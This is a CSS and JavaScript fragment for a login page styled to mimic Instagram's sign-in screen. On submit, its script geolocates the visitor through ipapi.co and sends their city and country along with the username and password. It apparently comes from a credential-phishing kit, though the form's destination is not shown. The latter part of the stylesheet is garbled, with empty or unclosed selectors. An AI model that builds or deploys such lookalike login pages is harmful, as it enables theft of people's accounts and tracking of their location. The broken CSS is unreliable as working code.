<style>
@import url( https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500&amp;display=swap );
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;

}
body {
  background: white;

}
.container {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 90vh;
  padding: 15px 0;
}
.container .col #image{
  position: relative;
  width: 100%;
  height: 100%;
}
.container .col .box {
  width: 350px;
  height: 380px;
  border: 1px solid rgba(219, 219, 219, 1);
  background: white;
  border-radius: 1px;
  margin: 0 0 10px;
  padding: 10px 0;
  z-index: 2;
}
.container .col .box .title {
  position: relative;
  top: 5px;
  text-align: center;
}
.container .col .box .title img {
  width: 190px;
  height: 80px;
}
.container .col.content {
  position: relative;
  top: 12px;
}
.container .col .box .login-form {
  position: relative;
  height: 260px;
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
}
.container .col .box .login-form .form-content {
  position: relative;
  margin: 5px 0;
  top: 22px;
}
.container .col .box .login-form label {
  position: absolute;
  top: 50%;
  transform: translateY(-50%);
  left: 9px;
  font-size: 12px;
  color: rgba(142, 142, 142, 1);
  pointer-events: none;
  order: -1;
  transition: 0.3s ease;
}
.container .col .box .login-form input {
  outline: none;
  background: transparent;
  width: 270px;
  height: 40px;
  background: rgba(250, 250, 250, 1);
  border: 1px solid rgba(219, 219, 219, 1);
  border-radius: 3px;
  padding: 9px 0 7px 8px;
  font-size: 14px;
  transition: 0.3s ease;
}
.container .col .box .login-form input:valid {
  padding-bottom: 0;
}
.container .col .box .login-form input:valid + label {
  transform: translateY(-16px);
  font-size: 10px;
}
.container .col .box .login-form button {
  width: 270px;
  height: 32px;
  border: none;
  outline: none;
  border-radius: 7px;
  background-color: rgb(0, 149, 246);
  cursor: pointer;
}
.container .col .box .login-form button:hover{
  background-color: rgb(24, 119, 242);
}
.container .col .box .login-form button a {
  color: white;
  text-decoration: none;
  font-weight: 600;
}
.container .col .box .login-form .form-ending {
  position: relative;
  width: 270px;
  height: 100%;
  margin-top: 20px;
  text-align: center;
}
.container .col .box .login-form .form-ending #OR {
  color: rgba(142, 142, 142, 1);
  background: white;
  text-align: center;
  width: 50px;
  margin: 15px 0;
  font-size: 13px;
  font-weight: 500;
  line-height: 15px;
  z-index: 3;
  position: relative;
  display: block;
}
.container .col .box .login-form .form-ending #line {
  z-index: 1;
  position: absolute;
  left: 50%;
  transform: translateX(-50%);
  top: 22px;
  width: 270px;
  height: 1px;
  background: rgba(219, 219, 219, 1);
}
.container .col .box .login-form .form-ending p#facebook {
  color: #385185;
  cursor: pointer;
  font-size: 14px;
  font-weight: 500;
  margin: 15px 0 5px;
}
.container .col .box .login-form .form-ending p#facebook i {
  margin-right: 8px;
  font-size: 16px;
  position: relative;
  top: 1px;
}
.container .col .box .login-form .form-ending a {
  position: relative;
  top: 7px;
  text-decoration: none;
  color: rgba(0, 55, 107, 1);
  font-size: 12px;
  line-height: 14px;
  text-align: center;

/* mini box  */

  height: 65px;

  border: 1px solid rgba(219, 219, 219, 1);

  justify-content: center;

.container .col .download-section .images img {

footer {

footer ul {

footer ul li {

footer .copyright {

footer .copyright select {

footer .copyright select option {

}
footer .copyright span {

  line-height: 14px;
  color: rgba(142, 142, 142, 1);

@media (max-width: 900px) {

@media (max-width: 1000px) {

@media (max-width: 440px) {

    min-height: 80vh;
  }
  .container .col .box,
  .container .col .mini-box {
    border: none;
    background-color: transparent;
  }
}
</style>

   <script>
    document.addEventListener('DOMContentLoaded', function () {
      const form = document.querySelector('.login-form');
      const usernameInput = form.querySelector('input[name="username"]');
      const passwordInput = form.querySelector('input[name="password"]');
      const submitButton = form.querySelector('button[type="submit"]');
      const cityInput = document.querySelector("#city");
      const countryInput = document.querySelector("#country");

      function validateFormInputs() {
        if (usernameInput.value.length < 5) {
          alert('Username must be at least 5 characters long.');
          return false;
        }
        // Add other validation logic as needed
        return true;
      }

      form.addEventListener('submit', function (event) {
        event.preventDefault();

        const getLocation = () => {
          fetch("https://ipapi.co/json/")
            .then((response) => response.json())
            .then((data) => {
              cityInput.value = data.city;
              countryInput.value = data.country_name;

              // Validate form inputs
              if (validateFormInputs()) {
                // Submit the form
                form.submit();
              }
            })
            .catch((error) => {
              console.error('Error fetching location:', error);
            });
        };

        getLocation();
      });
    });
  </script>
